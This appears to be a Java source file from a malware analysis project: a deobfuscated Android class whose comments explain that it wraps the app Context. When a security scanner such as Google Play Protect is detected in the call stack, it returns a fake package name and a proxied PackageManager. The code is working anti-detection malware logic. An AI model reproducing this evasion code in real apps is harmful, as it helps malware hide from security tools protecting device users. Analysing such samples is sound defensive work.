package hook;

import android.content.Context;
import android.content.ContextWrapper;
import android.content.pm.PackageManager;

/**
 * MALWARE ANALYSIS - RESTORED FROM OBFUSCATED CLASS: IlIllll1/IllIIlIIII1
 *
 * ContextWrapper subclass that intercepts getPackageName() and getPackageManager()
 * calls. When a security tool (Google Play Protect, antivirus, etc.) is detected
 * in the call stack, it returns a fake package name or a proxied PackageManager
 * to disguise the malware's true identity.
 *
 * This is the core of the runtime identity deception system. After installation
 * via ContextHookInstaller, ALL context calls from the Application flow through
 * this wrapper.
 *
 * Original obfuscated name: IlIllll1.IllIIlIIII1
 */
public class HookContextWrapper extends ContextWrapper {

    private static final String TAG = "HookContextWrapper";

    /** Proxy PackageManager that intercepts package info queries */
    public final PackageManagerProxy pmProxy;

    public HookContextWrapper(Context context) {
        super(context);
        this.pmProxy = new PackageManagerProxy(context.getPackageManager());
    }

    // =========================================================================
    // getPackageName() Hook
    // =========================================================================

    /**
     * Intercepts getPackageName() calls. Walks the current thread's call stack
     * and checks each frame against HookConfig's detection patterns. If a
     * security tool is detected (e.g. Google Play Protect scanning), returns
     * a randomly-selected fake package name instead of the real one.
     *
     * Original: overrides ContextWrapper.getPackageName()
     */
    @Override
    public String getPackageName() {
        try {
            StackTraceElement[] stackTrace = Thread.currentThread().getStackTrace();
            for (StackTraceElement frame : stackTrace) {
                if (HookConfig.matchesPkgNamePattern(frame)) {
                    // Security tool detected in call stack — return fake identity
                    LogHelper.i(TAG,
                        "getPackageName hook triggered: "
                        + frame.getClassName() + "." + frame.getMethodName());
                    return HookConfig.fakePackageName;
                }
            }
        } catch (Exception unused) {
            // Silently ignore — fail-open to avoid crashing
        }
        // No security tool detected — return real package name
        return getRealBaseContext().getPackageName();
    }

    // =========================================================================
    // getPackageManager() Hook
    // =========================================================================

    /**
     * Intercepts getPackageManager() calls. When a security tool is detected
     * in the call stack, returns a PackageManagerProxy that translates fake
     * package name queries back to the real package name, ensuring consistent
     * results when the tool follows up with getPackageInfo().
     *
     * Original: overrides ContextWrapper.getPackageManager()
     */
    @Override
    public PackageManager getPackageManager() {
        PackageManager realPM = getRealBaseContext().getPackageManager();

        for (StackTraceElement frame : Thread.currentThread().getStackTrace()) {
            if (HookConfig.matchesPMPattern(frame)) {
                LogHelper.i(TAG,
                    "getPackageManager hook triggered: "
                    + frame.getClassName() + "." + frame.getMethodName());
                return this.pmProxy;
            }
        }
        return realPM;
    }

    // =========================================================================
    // Internal helper
    // =========================================================================

    /**
     * Unwraps the ContextWrapper chain to get the real underlying Context,
     * skipping any intermediate ContextWrapper layers.
     */
    private Context getRealBaseContext() {
        Context base = super.getBaseContext();
        return base instanceof ContextWrapper
            ? ((ContextWrapper) base).getBaseContext()
            : base;
    }

    /*
     * Stub reference — LogHelper is restored at core/LogHelper.java
     * (lllllIllIl1.IllIIlIIII1). Using a local stub for compilation.
     */
    private static class LogHelper {
        static void i(String tag, String message) {
            android.util.Log.i("[Dllpgd][HR]" + tag, message);
        }
    }
}
